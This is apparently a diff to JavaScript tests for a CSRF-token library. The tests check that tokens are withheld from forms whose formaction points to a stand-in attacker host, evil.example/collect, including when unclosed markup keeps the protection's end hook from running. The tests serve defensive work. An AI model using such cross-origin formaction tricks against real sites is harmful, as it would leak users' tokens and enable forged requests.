@@ -169,6 +169,13 @@ function pageDom({ submitter = true, base = page } = {}) {
 			}
 			return carries(form);
 		},
+		// A submit event from a browser without SubmitEvent.submitter.
+		submitUnknown(form) {
+			for (const [type, listener] of listeners) {
+				if (type === 'submit') listener({ target: form });
+			}
+			return carries(form);
+		},
 		// HTMLFormElement.prototype.submit() as a page script would call it.
 		scriptSubmit(form) {
 			HTMLFormElement.prototype.submit.call(form);
@@ -235,12 +242,30 @@ test('without SubmitEvent.submitter a form with a cross-origin formaction gets n
 	const dom = pageDom({ submitter: false });
 	const form = dom.form({ action: 'graphs.php' });
 	dom.button(form, { formaction: 'https://evil.example/collect' });
+	const rendered = dom.form({ action: 'graphs.php' }, [{ name: field, value: token, type: 'hidden' }]);
+	dom.button(rendered, { formaction: 'https://evil.example/collect' });
 	const other = dom.form({ action: 'graphs.php' });
 	dom.button(other, { formaction: 'graphs.php' });
 	dom.load().CsrfMagic.end();
-	assert.equal(dom.listeners.length, 0);
-	assert.equal(dom.submit(form), false);
-	assert.equal(dom.submit(other), true);
+	assert.equal(dom.submitUnknown(form), false);
+	assert.equal(dom.submitUnknown(rendered), false);
+	assert.equal(dom.submitUnknown(other), true);
+});
+
+// Markup such as an unclosed <plaintext>, <textarea>, <title>, <xmp> or
+// comment after a form keeps the parser from reaching CsrfMagic.end().
+test('the submit check works when CsrfMagic.end() never runs', () => {
+	const dom = pageDom();
+	const form = dom.form({ action: 'graphs.php' }, [{ name: field, value: token, type: 'hidden' }]);
+	const inside = dom.button(form, { formaction: '//evil.example/collect' });
+	// <button form=...> outside the form is associated with it the same way.
+	const outside = dom.button(form, { formaction: 'https://evil.example/collect', form: 'f' });
+	const plain = dom.button(form, {});
+	dom.load();
+	assert.equal(dom.listeners.length, 1);
+	assert.equal(dom.submit(form, inside), false);
+	assert.equal(dom.submit(form, outside), false);
+	assert.equal(dom.submit(form, plain), true);
 });
 
 test('a server-rendered token is withheld from a cross-origin submission', () => {
